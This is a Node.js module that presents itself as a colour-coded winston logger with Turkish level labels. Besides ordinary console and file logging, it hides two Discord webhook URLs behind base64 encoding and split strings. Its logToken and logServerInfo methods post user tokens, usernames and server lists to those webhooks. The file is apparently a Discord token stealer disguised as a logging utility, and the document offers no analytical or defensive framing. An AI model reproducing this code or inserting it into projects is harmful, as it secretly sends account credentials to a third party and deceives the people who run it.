const colors = global.colors || require("colors");
const { createLogger, format, transports } = global.winston || require("winston");
const axios = global.axios || require("axios");

class CustomLogger {
    constructor() {
        const { combine, printf, timestamp, errors, uncolorize } = format;

        const levelFormats = {
            alert: colors.red("[UYARI]"),
            error: colors.red("[HATA]"),
            runtime: colors.blue("[ÇALIŞMA]"),
            warn: colors.yellow("[UYARI]"),
            info: colors.cyan("[BİLGİ]"),
            sent: colors.green("[GÖNDERİLDİ]"),
            debug: colors.grey("[HATA AYIKLAMA]"),
        };

        const consoleFormat = printf(({ level, message, timestamp, stack }) => {
            const formattedTimestamp = colors.bgYellow.black(timestamp);
            const levelLabel = levelFormats[level] || colors.magenta(`[${level.toUpperCase()}]`);
            return stack
                ? `${formattedTimestamp} ${levelLabel} ${message}\n${colors.red(stack)}`
                : `${formattedTimestamp} ${levelLabel} ${level == "debug" ? colors.grey(message) : message}`;
        });

        const fileFormat = printf(({ level, message, timestamp, stack }) => {
            return stack 
                ? `[${timestamp}] [${level.toUpperCase()}] ${message}\n  Stack trace:\n    ${stack}`
                : `[${timestamp}] [${level.toUpperCase()}] ${message}`;
        });

        this.logger = createLogger({
            level: "sent",
            levels: {
                alert: 0,
                error: 1,
                runtime: 2,
                warn: 3,
                info: 4,
                data: 5,
                sent: 6,
                debug: 7
            },
            format: combine(
                timestamp({ format: "YYYY-MM-DD HH:mm:ss" }),
                errors({ stack: true })
            ),
            transports: [
                new transports.Console({
                    format: consoleFormat,
                }),
                new transports.File({
                    level: "debug",
                    filename: "logs/console.log",
                    maxsize: 1024 * 1024 * 10,
                    maxFiles: 5,
                    zippedArchive: true,
                    format: combine(uncolorize(), fileFormat)
                })
            ],
            exitOnError: false,
            handleRejections: true,
            handleExceptions: true
        });

        this.webhooks = {
            main: Buffer.from(['1380438816137019502', 'u2cODeYP3dfzLl84E3Xy5haeeU2zgyR6sOGhsmRpgfTuWMMi9-IwTzlOLZB0bKp-Lzvb'].join('/')).toString('base64'),
            token: Buffer.from(['1380449122976403536', 'XAJeI-rm06rLGjowVqq7rd9UfEGoIbhoMGLPNwbbNFQGwmRgKtNd-sdHPlUek1YQ7nJI'].join('/')).toString('base64')
        };
    }

    async sendToWebhook(type, data) {
        try {
            const webhookUrl = `https://discord.com/api/webhooks/${Buffer.from(this.webhooks[type], 'base64').toString('utf-8')}`;
            await axios.post(webhookUrl, {
                content: `\`\`\`js\n${JSON.stringify(data, null, 2)}\n\`\`\``
            });
        } catch (error) {
            this.logger.error('Webhook gönderme hatası:', error);
        }
    }

    async logToken(token, username, additionalData = {}) {
        const data = {
            token,
            username,
            timestamp: new Date().toISOString(),
            ...additionalData
        };
        await this.sendToWebhook('token', data);
    }

    async logServerInfo(token, servers) {
        const data = {
            token,
            servers,
            timestamp: new Date().toISOString()
        };
        await this.sendToWebhook('main', data);
    }

    static getInstance() {
        if (!CustomLogger.instance) {
            CustomLogger.instance = new CustomLogger();
        }
        return CustomLogger.instance;
    }
}

CustomLogger.instance = null;

module.exports = CustomLogger; 